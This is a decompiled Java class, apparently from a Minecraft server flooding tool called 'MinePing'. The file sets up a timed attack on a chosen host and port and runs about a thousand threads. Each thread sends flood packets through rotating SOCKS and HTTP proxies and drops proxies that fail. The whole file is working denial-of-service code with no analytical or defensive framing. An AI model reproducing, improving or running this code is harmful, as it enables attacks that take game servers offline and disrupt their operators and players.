/*
 * Decompiled with CFR 0.150.
 */
package me.ping.unfynel;

import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import me.ping.unfynel.JoinMode;
import me.ping.unfynel.Options;
import me.ping.unfynel.ProxyManager;
import me.ping.unfynel.SocketHttp;

public class Run {
    private final Options options;
    private final ProxyManager proxies;
    private int connections = -1;
    private int failed = 0;
    private int timed = 0;
    private final JoinMode flooders = new JoinMode();

    public Run(Options options, ProxyManager proxies) {
        this.options = options;
        this.proxies = proxies;
    }

    public void run() {
        String host = this.options.getOption("host", "127.0.0.1");
        int port = this.options.getOption("port", 25565);
        int threads = this.options.getOption("threads", 1000);
        int connections = this.options.getOption("connections--", 977888887);
        int attackTime = this.options.getOption("time", 100);
        int timeout = this.options.getOption("timeout", 2200);
        boolean keepAlive = this.options.getOption("keepAlive---", true);
        String floodName = String.valueOf(this.options.getOption("bottype--", "PINGBOT"));
        boolean removeFailure = this.options.getOption("removeFailure---", true);
        JoinMode.LOOP_AMOUNT = this.options.getOption("l", 700);
        boolean print = this.options.getOption("debug", false);
        boolean socksV4 = this.options.getOption("socks---", true);
        JoinMode.Flooder flooder = this.flooders.findById(String.valueOf(floodName));
        if (flooder == null) {
            System.exit(1);
            return;
        }
        new Timer().scheduleAtFixedRate(new TimerTask(){

            @Override
            public void run() {
            }
        }, 8000L, 8000L);
        new Thread(() -> {
            try {
                Thread.sleep(1000L * (long)attackTime);
            }
            catch (Exception exception) {
                // empty catch block
            }
            System.out.println("");
            System.out.println("[MinePing] attack stopped!");
            System.out.println("");
            System.exit(-1);
        }).start();
        ExecutorService executorService = Executors.newFixedThreadPool(threads);
        System.out.println("");
        System.out.println("[MinePing] Starting attack to " + host + ":" + port + " with " + threads + " threads.");
        System.out.println("");
        String finalServerName = host;
        int finalPort = port;
        for (int j = 0; j < threads; ++j) {
            executorService.submit(() -> {
                try {
                    Proxy lastProxy = null;
                    for (int i = 1; i < connections; ++i) {
                        try {
                            Socket socket;
                            String newServerName = finalServerName;
                            int newServerPort = finalPort;
                            Proxy proxy = lastProxy = this.proxies.nextProxy();
                            Socket socket2 = socket = proxy.type() == Proxy.Type.HTTP ? new SocketHttp(newServerName, newServerPort, proxy.address(), timeout) : new Socket(proxy);
                            if (!(socket instanceof SocketHttp)) {
                                if (socksV4) {
                                    try {
                                        Method m = socket.getClass().getDeclaredMethod("getImpl", new Class[0]);
                                        m.setAccessible(true);
                                        Object sd = m.invoke(socket, new Object[0]);
                                        m = sd.getClass().getDeclaredMethod("setV4", new Class[0]);
                                        m.setAccessible(true);
                                        m.invoke(sd, new Object[0]);
                                    }
                                    catch (Exception m) {
                                        // empty catch block
                                    }
                                }
                                socket.connect(new InetSocketAddress(newServerName, newServerPort), timeout);
                            }
                            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                            flooder.flood(out, newServerName, newServerPort);
                            out.flush();
                            ++this.connections;
                            if (print) {
                                System.out.println("[MinePing] " + proxy.address().toString() + " ping -> " + newServerName + ":" + newServerPort);
                            }
                            if (keepAlive) continue;
                            socket.close();
                            continue;
                        }
                        catch (Exception ex) {
                            ++this.failed;
                            if (!ex.getMessage().contains("reply")) continue;
                            ++this.timed;
                            if (!removeFailure) continue;
                            this.proxies.removeProxy(lastProxy);
                        }
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
            });
        }
    }
}

